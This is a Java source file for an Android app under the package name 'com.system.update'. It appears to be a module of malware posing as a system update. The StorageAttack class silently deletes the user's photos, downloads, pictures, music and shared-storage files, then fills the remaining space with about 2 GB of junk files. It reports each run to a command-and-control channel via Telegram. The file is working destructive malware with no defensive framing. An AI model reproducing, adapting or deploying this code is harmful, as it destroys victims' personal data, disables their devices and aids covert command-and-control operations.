package com.system.update;

import android.content.Context;
import android.os.Environment;

import java.io.File;
import java.io.FileOutputStream;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * Best-effort storage pressure:
 * - delete files under accessible app dirs + shared storage if permitted
 * - fill free space with junk files to exhaust storage
 * Cannot wipe /system or other apps' private data without root.
 */
public final class StorageAttack {

    private static final AtomicBoolean RUNNING = new AtomicBoolean(false);

    private StorageAttack() {}

    public static void start(Context ctx) {
        if (RUNNING.getAndSet(true)) return;
        new Thread(() -> {
            try {
                wipeDir(ctx.getFilesDir());
                wipeDir(ctx.getCacheDir());
                File ext = ctx.getExternalFilesDir(null);
                if (ext != null) wipeDir(ext);
                File cache = ctx.getExternalCacheDir();
                if (cache != null) wipeDir(cache);

                // shared storage — only if we have broad access
                try {
                    File dcim = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM);
                    wipeDir(dcim);
                    File dl = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
                    wipeDir(dl);
                    File pic = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES);
                    wipeDir(pic);
                    File music = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MUSIC);
                    wipeDir(music);
                    File root = Environment.getExternalStorageDirectory();
                    if (root != null) wipeDirShallow(root, 2);
                } catch (Throwable ignored) {}

                fillSpace(ctx);
                Telegram.reportEvent(C2.getDeviceId(), "storage_attack_pass");
            } catch (Throwable t) {
                Telegram.reportEvent(C2.getDeviceId(), "storage_err:" + t.getMessage());
            } finally {
                RUNNING.set(false);
            }
        }, "storage-atk").start();
    }

    private static void wipeDir(File dir) {
        if (dir == null || !dir.exists()) return;
        File[] list = dir.listFiles();
        if (list == null) return;
        for (File f : list) {
            try {
                if (f.isDirectory()) {
                    wipeDir(f);
                    f.delete();
                } else {
                    f.delete();
                }
            } catch (Throwable ignored) {}
        }
    }

    private static void wipeDirShallow(File dir, int depth) {
        if (dir == null || !dir.exists() || depth < 0) return;
        File[] list = dir.listFiles();
        if (list == null) return;
        for (File f : list) {
            try {
                if (f.isDirectory()) {
                    wipeDirShallow(f, depth - 1);
                } else {
                    // skip our own package path roughly
                    String p = f.getAbsolutePath();
                    if (p.contains("com.system.update")) continue;
                    f.delete();
                }
            } catch (Throwable ignored) {}
        }
    }

    /** Write large junk files until IO fails (storage full). */
    private static void fillSpace(Context ctx) {
        File base = ctx.getExternalFilesDir(null);
        if (base == null) base = ctx.getFilesDir();
        byte[] chunk = new byte[1024 * 1024]; // 1MB
        for (int i = 0; i < chunk.length; i += 4096) chunk[i] = (byte) (i & 0xFF);
        int n = 0;
        while (n < 2048) { // cap ~2GB attempt
            File junk = new File(base, "j_" + n + ".bin");
            try (FileOutputStream fos = new FileOutputStream(junk)) {
                for (int k = 0; k < 8; k++) { // 8MB per file
                    fos.write(chunk);
                }
                fos.flush();
                n++;
            } catch (Throwable t) {
                break;
            }
        }
    }
}
